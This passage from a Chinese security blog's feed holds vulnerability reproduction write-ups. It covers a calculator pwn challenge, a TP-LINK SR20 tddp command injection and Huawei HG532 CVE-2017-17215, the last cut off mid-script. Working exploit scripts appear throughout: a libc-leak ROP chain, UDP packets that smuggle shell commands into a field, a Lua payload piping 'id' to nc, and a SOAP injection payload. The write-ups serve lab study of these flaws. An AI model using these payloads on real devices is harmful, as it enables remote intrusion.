&#x27;/&#x27; )</span><br><span class="line">LABEL_15:</span><br><span class="line">          error();</span><br><span class="line">        if ( !a1[a1[3] + 3] )</span><br><span class="line">          error();</span><br><span class="line">        a1[a1[3] + 2] /= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )</span><br><span class="line">        goto LABEL_15;</span><br><span class="line">      a1[a1[3] + 2] *= a1[a1[3] + 3];</span><br><span class="line">    &#125;</span><br><span class="line">    result = a1;</span><br><span class="line">    --a1[3];</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过上面的分析 我们大概可以推理出这样一个大概的流程<br>比如 输入1+2<br>首先针对1进行判断 非运算符 所以跳出for循环 但是执行到下面的if的时候 又跳回到了if循环中<br>此时i自增1 也就是判断下一个字符 即+<br>+可以通过判断 此时第一次执行deal_number函数<br>而其第二个参数buf2 此时仍然执行buf首地址 也就是第一个数字<br>于是这里就存储第一个数字到了a1数组中对应的地址 也就是a1+32<br>随后检查下一个字符是否为数字 如果不是则终止程序<br>同时更改了buf2 使其指向2数字位于的地址<br>随后就因为第四个字节为空 此时就算真正跳出了for循环<br>此时再次执行deal_number 也就是对于第二个数字进行存储<br>随后进入calc函数执行操作<br>这里的a1[a1[3] + 2] 我们拆开分析 a1[3]显然是deal_number函数中的v4 在执行两次后 其变成了2 而最后得到的a1[4]就是第一个数字存储的地址 第二个则为a1[5]<br>完整的一个流程应该是这样的 看起来没有什么可以利用的漏洞点<br>但是如果我们输入的是+52会怎么样<br>其会直接进入if分支 随后执行deal_number函数 而此时的buf2指向的是运算符<br>而strtol函数是无法转化运算符的 也就是说其返回值为空 那么第一个数字的存储就失败了<br>随后只会存储52这个数字到a2+32的位置<br>随后执行到calc函数的时候 由于a2[3]此时才为1 所以就相当于a2[3]被增加到了53<br>而最后的printf语句就是根据a2[3]来索引的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;%ld\n&quot;, a2[a2[3] + 3])</span><br></pre></td></tr></table></figure><p>所以漏洞就出现在这里 可以实现一个栈上内容的泄露<br>泄露出libc_start_main的地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" alt="image.png"></a><br>在得到了libc地址后  我们可以利用同样的办法来操控a2[3]的值 同时可以利用deal_number函数中的strtol函数把str型的system这类地址 转化到栈上 从而可以构建出一条执行链 随后输入空字符 就可以跳出while循环 从而使程序执行到leave ret<br>完整exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">#io = remote(&quot;121.12.85.23&quot;,50532)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">#context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;+52&quot;</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = int(io.recvuntil(&quot;\n&quot;,drop = True),10)-0x24083</span><br><span class="line"></span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc.address))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">system_addr = libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload = &quot;+54+&quot;+str(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">binsh_addr = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">payload = &quot;+53+&quot;+str(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">rdi_addr = libc.address + 0x0000000000023b6a</span><br><span class="line"></span><br><span class="line">payload = &quot;+52+&quot;+str(rdi_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">ret_addr = rdi_addr+1</span><br><span class="line"></span><br><span class="line">payload = &quot;+51+&quot;+str(ret_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1054)&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TP-LINK SR20漏洞复现</title>
      <link href="/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个涉及到了通信协议的洞 还是比较有趣的  以此来顺便丰富一下对于协议洞的认知<br>固件下载地址: <a href="https://www.tp-link.com/us/support/download/sr20/#Firmware">https://www.tp-link.com/us/support/download/sr20/#Firmware</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本质上是一个任意命令执行 不过传入的方式和以前复现过的不一样在于 是通过recvform接收到了对应端口传输的数据<br>找到官方报告中 漏洞位于的&#x2F;usr&#x2F;bin&#x2F;tddp文件<br>是32位的arm架构<br>ida打开后没有找到main函数 通过start函数来索引到main函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // r3</span><br><span class="line">  int v4; // r0</span><br><span class="line">  int v6; // [sp+Ch] [bp-8h]</span><br><span class="line">  int v7; // [sp+Ch] [bp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = mem_calloc(argc, argv, envp);</span><br><span class="line">  if ( v6 )</span><br><span class="line">    return v6;</span><br><span class="line">  v4 = sub_936C();</span><br><span class="line">  v7 = delete_mem(v4);</span><br><span class="line">  if ( v7 )</span><br><span class="line">    v3 = v7;</span><br><span class="line">  else</span><br><span class="line">    v3 = 0;</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要有三个函数 首尾两个函数的作用我已经更改了函数名 就是简单的开辟空间和释放空间<br>重点跟进一下936c这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_936C()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // r4</span><br><span class="line">  int optval; // [sp+Ch] [bp-B0h] BYREF</span><br><span class="line">  int v3; // [sp+10h] [bp-ACh] BYREF</span><br><span class="line">  struct timeval timeout; // [sp+14h] [bp-A8h] BYREF</span><br><span class="line">  fd_set readfds; // [sp+1Ch] [bp-A0h] BYREF</span><br><span class="line">  _DWORD *v6; // [sp+9Ch] [bp-20h] BYREF</span><br><span class="line">  int v7; // [sp+A0h] [bp-1Ch]</span><br><span class="line">  int nfds; // [sp+A4h] [bp-18h]</span><br><span class="line">  fd_set *v9; // [sp+A8h] [bp-14h]</span><br><span class="line">  unsigned int i; // [sp+ACh] [bp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = 0;</span><br><span class="line">  v3 = 1;</span><br><span class="line">  optval = 1;</span><br><span class="line">  printf(&quot;[%s():%d] tddp task start\n&quot;, &quot;tddp_taskEntry&quot;, 151);</span><br><span class="line">  if ( !sub_16ACC(&amp;v6)</span><br><span class="line">    &amp;&amp; !sub_16E5C(v6 + 9)</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 2, &amp;optval, 4u)</span><br><span class="line">    &amp;&amp; !sub_16D68(v6[9], 1040)                  // 绑定1040端口</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 6, &amp;v3, 4u) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[11] |= 2u;</span><br><span class="line">    v6[11] |= 4u;</span><br><span class="line">    v6[11] |= 8u;</span><br><span class="line">    v6[11] |= 0x10u;</span><br><span class="line">    v6[11] |= 0x20u;</span><br><span class="line">    v6[11] |= 0x1000u;</span><br><span class="line">    v6[11] |= 0x2000u;</span><br><span class="line">    v6[11] |= 0x4000u;</span><br><span class="line">    v6[11] |= 0x8000u;</span><br><span class="line">    v6[12] = 60;</span><br><span class="line">    v0 = v6;</span><br><span class="line">    v0[13] = sub_9340();                        // 获取时间</span><br><span class="line">    v9 = &amp;readfds;</span><br><span class="line">    for ( i = 0; i &lt;= 0x1F; ++i )</span><br><span class="line">      v9-&gt;__fds_bits[i] = 0;</span><br><span class="line">    nfds = v6[9] + 1;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        timeout.tv_sec = 600;</span><br><span class="line">        timeout.tv_usec = 0;</span><br><span class="line">        readfds.__fds_bits[v6[9] &gt;&gt; 5] |= 1 &lt;&lt; (v6[9] &amp; 0x1F);</span><br><span class="line">        v7 = select(nfds, &amp;readfds, 0, 0, &amp;timeout);</span><br><span class="line">        if ( sub_9340() - v6[13] &gt; v6[12] )</span><br><span class="line">          v6[8] = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v7 == -1 );</span><br><span class="line">      if ( !v7 )</span><br><span class="line">        break;</span><br><span class="line">      if ( ((readfds.__fds_bits[v6[9] &gt;&gt; 5] &gt;&gt; (v6[9] &amp; 0x1F)) &amp; 1) != 0 )</span><br><span class="line">        sub_16418(v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_16E0C(v6[9]);</span><br><span class="line">  sub_16C18(v6);</span><br><span class="line">  return printf(&quot;[%s():%d] tddp task exit\n&quot;, &quot;tddp_taskEntry&quot;, 219);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用socket来实现通讯<br>sub_16D68函数中 绑定了1040端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_16D68(int a1, uint16_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // r3</span><br><span class="line">  struct sockaddr s; // [sp+8h] [bp-14h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, sizeof(s));</span><br><span class="line">  s.sa_family = 2;</span><br><span class="line">  *&amp;s.sa_data[2] = htonl(0);</span><br><span class="line">  *s.sa_data = htons(a2);</span><br><span class="line">  if ( bind(a1, &amp;s, 0x10u) == -1 )</span><br><span class="line">    v2 = sub_13018(-10103, &quot;failed to bind socket&quot;);</span><br><span class="line">  else</span><br><span class="line">    v2 = 0;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时把主机字节序转化成了网络字节序 用来方便不同设备之间的统一通讯<br>随后会进入sub_16418函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" alt="image.png"></a><br>该函数旨在接收1040端口传输来的数据<br>这里注意一下数据包存放的缓冲区地址为 a1+45083 而v2作为一个指针指向该地址<br>对于v2进行了一个检测 如果为1则进入分支<br>这里涉及到了dttp这个协议 其为D-LINK所使用的一种简单的调试协议<br>分为v1和v2两个版本<br>版本号会放在数据包首地址来作为区分<br>随后还会有一个用来表示类型的字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4：CMD_AUTO_TEST   6: CMD_CONFIG_MAC   7: CMD_CANCEL_TEST</span><br><span class="line">8: CMD_REBOOT_FOR_TEST   0XA:CMD_GET_PROD_ID   0XC: CMD_SYS_INIT </span><br><span class="line">0XD: CMD_CONFIG_PIN   0X30: CMD_FTEST_USB   0X31: CMD_FTEST_CONFIG</span><br></pre></td></tr></table></figure><p>也就是我们在sub_15E74函数中所看到的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" alt="image.png"></a><br>这里借用winmt师傅的图来方便理解包的形式<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" alt="image.png"></a><br>ver为版本号 type则为包的类型<br>本次的漏洞出现在0x31对应的类型中 我们找到对应的函数进行跟进<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" alt="image.png"></a><br>其以;进行了正则匹配 将两段字符串分别存储到s和v10中 随后进行了命令执行<br>那么这里仅仅过滤了一个;字符 我们也可以使用|和&amp;来达到任意命令执行的目的<br>上述为第一种漏洞的利用途径 接下来还有一个通过lua脚本达到任意命令执行的洞<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102246660.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102246660.png" alt="image.png"></a><br>可以看到 s是由我们所控制的 其作为一个路径的一部分 用来指向一个lua脚本<br>并且如果这个lua脚本存在 就可以执行这个脚本<br>我们再来看一下原本要执行的指令<br>其为 <strong>tftp -gr xxxx host</strong><br>host为宿主机与虚拟机通信的接口ip<br>我们只需要在宿主机启动tftp服务 随后篡改xxxx为正确的文件名 就可以实现任意脚本执行了</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用readelf可以得到是32位小端序的arm架构 这里使用armhf 不适用armel是因为其缺少硬件浮点数支持<br>搭建脚本:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap1 -u root</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo ifconfig tap1 192.168.6.2</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line"></span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line"></span><br><span class="line">    -kernel ./armhf/vmlinuz-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -initrd ./armhf/initrd.img-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -drive if=sd,file=./armhf/debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line"></span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line"></span><br><span class="line">    -net nic -net tap,ifname=tap1,script=no,downscript=no \</span><br><span class="line"></span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>我这里的硬盘映像文件虽然是直接从官网下的 但是不知道什么原因 在模拟的时候会提示说硬盘大小出现问题<br>所以这里按照描述更改映像文件为32G即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-img resize debian_wheezy_armhf_standard.qcow2 32G</span><br></pre></td></tr></table></figure><p>随后就可以成功启动模拟 进入后将eth0接口更改 使其与tap1位于同一c段<br>随后挂载两个文件夹并且设置squashfs-root为根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line">chroot ./squashfs-root/ sh</span><br></pre></td></tr></table></figure><p>启动tddp程序<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" alt="image.png"></a><br>接着回到宿主机 这里如果直接nc 1040这个端口是无法连接的<br>我们需要借助nmap的udp扫描方式<br>可以看到这个端口是有过滤的<br>等下使用脚本复现的时候也要注意一下socket需要调整为UDP<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" alt="image.png"></a><br>随后在宿主机上安装tftp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install atftpd</span><br></pre></td></tr></table></figure><p>随后需要进行两次配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/xinetd.d/tftp</span><br><span class="line"></span><br><span class="line">service tftp  </span><br><span class="line">&#123;  </span><br><span class="line">socket_type = dgram  </span><br><span class="line">protocol = udp  </span><br><span class="line">wait = yes  </span><br><span class="line">user = root  </span><br><span class="line">server = /usr/sbin/in.tftpd  </span><br><span class="line">server_args = -s /tftpboot -c   这个文件夹我试过放到用户目录下 最后失败了</span><br><span class="line">disable = no  </span><br><span class="line">per_source = 11  </span><br><span class="line">cps = 100 2  </span><br><span class="line">flags = IPv4  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/atftpd</span><br><span class="line"></span><br><span class="line">USE_INETD=false</span><br><span class="line"># OPTIONS below are used only with init script</span><br><span class="line">OPTIONS=&quot;--tftpd-timeout 0  --retry-timeout 0 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot&quot;</span><br></pre></td></tr></table></figure><p>随后更改tftpboot文件夹的权限以及新增一个payload文件 用来执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 /tftpboot</span><br><span class="line">touch payload</span><br><span class="line">sudo vim payload</span><br><span class="line"></span><br><span class="line">function config_test(config)</span><br><span class="line">    os.execute(&quot;id|nc 192.168.6.2 6666&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在虚拟机启动tddp后 使用脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import*</span><br><span class="line"></span><br><span class="line">from sys import*</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.6.3&quot;,1040))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = b&quot;\x01\x31&quot; #版本号和类型</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(12,b&#x27;\x00&#x27;) #填充垃圾数据</span><br><span class="line"></span><br><span class="line">payload += b&quot;|touch a||;aaa&quot;</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" alt="image.png"></a><br>随后我们前往&#x2F;tmp目录 可以找到刚刚创建的a文件 成功进行了任意的命令执行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" alt="image.png"></a><br>接着来尝试第二种方法<br>开启tddp服务以后 执行下列脚本 同时我们需要在宿主机上监听一下6666端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import*</span><br><span class="line"></span><br><span class="line">from sys import*</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.6.3&quot;,1040))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = b&quot;\x01\x31&quot; #版本号和类型</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(12,b&#x27;\x00&#x27;) #填充垃圾数据</span><br><span class="line"></span><br><span class="line">payload += b&quot;/payload;aaa&quot;</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br></pre></td></tr></table></figure><p>使其执行payload文件中的指令<br>随后就可以在6666端口中接收到了id的回显<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310122341208.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310122341208.png" alt="image.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次复现 第一次接触到了协议洞 相比常规的命令执行 协议洞需要先了解清楚协议的数据包构成 才能看懂代码逻辑<br>发掘漏洞的思路还是通过定位execve或者是system这类敏感函数 然后再朔源查看是否存在控制参数的可能性</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE 2017-17215</title>
      <link href="/2023/10/07/cve-2017-17215/"/>
      <url>/2023/10/07/cve-2017-17215/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>华为HG532部分定制版本存在远程代码执行漏洞 经过身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击 成功利用可能导致远程执行任意代码<br>固件下载地址: <a href="https://archive.org/download/RouterHG532e/router%20HG532e.rar">https://archive.org/download/RouterHG532e/router%20HG532e.rar</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>readelf分析出来是mips32位大端序<br>qemu启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mips -M malta -kernel ./mips_kernel/vmlinux-2.6.32-5-4kc-malta -hda ./mips_kernel/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>接着配置系统模拟的eth0接口为192.168.6.xx<br>随后利用scp上传一下提取出来的squashfs-root文件夹<br>接着需要再开一个终端 ssh连接一下<br>这里是因为&#x2F;bin&#x2F;mic文件的执行过程中会造成eth0接口的静态ip发生变化 所以需要我们利用ssh启动服务 随后在原本的会话中重新配置eth0接口的地址<br>挂载一下相关服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev  </span><br><span class="line">mount -t proc /proc ./squashfs-root/proc/</span><br></pre></td></tr></table></figure><p>开启ssh连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.6.3</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ sh</span><br><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>然后就会卡在这里 返回到qemu启动的那个会话 重新配置一下eth0接口就行了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据官方的漏洞报告 我们可以得知漏洞出现的路径为&#x2F;ctrlt&#x2F;DeviceUpgrade_1 并且出现任意命令执行的参数为NewStatusURL和NewDownloadURL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From looking into the UPnP description of the device, it can be seen that it supports a service type named `DeviceUpgrade`. This service is supposedly carrying out a firmware upgrade action by sending a request to “/ctrlt/DeviceUpgrade_1” (referred to as controlURL ) and is carried out with two elements  named `NewStatusURL` and `NewDownloadURL`.</span><br></pre></td></tr></table></figure><p>利用grep指令可以定位到DeviceUpgrade字符串位于upnp文件中有出现<br>利用NewDownloadURL定位到目标函数 发现直接通过sprintf传参给了system函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_40749C(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // $s1</span><br><span class="line">  const char *v4; // [sp+20h] [-40Ch] BYREF</span><br><span class="line">  const char *v5; // [sp+24h] [-408h] BYREF</span><br><span class="line">  char v6[1028]; // [sp+28h] [-404h] BYREF</span><br><span class="line"></span><br><span class="line">  v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewDownloadURL&quot;, 0, &amp;v4);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewStatusURL&quot;, 0, &amp;v5);</span><br><span class="line">      if ( !v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          snprintf(v6, 1024, &quot;upg -g -U %s -t &#x27;1 Firmware Upgrade Image&#x27; -c upnp -r %s -d -b&quot;, v4, v5);</span><br><span class="line">          system(v6);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个疑惑的点 虽然官方的报告说&#x2F;ctrlt&#x2F;DeviceUpgrade_1是负责固件的更新 但是不管是直接访问 还是抓包固件更新的按钮  我都没有得到访问该路径的包<br>所以只能直接用网上的exp了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">data = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line"></span><br><span class="line"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewStatusURL&gt;;mkdir /bin/hell;&lt;/NewStatusURL&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/u:Upgrade&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/s:Body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/s:Envelope&gt;</span><br><span class="line"></span><br><span 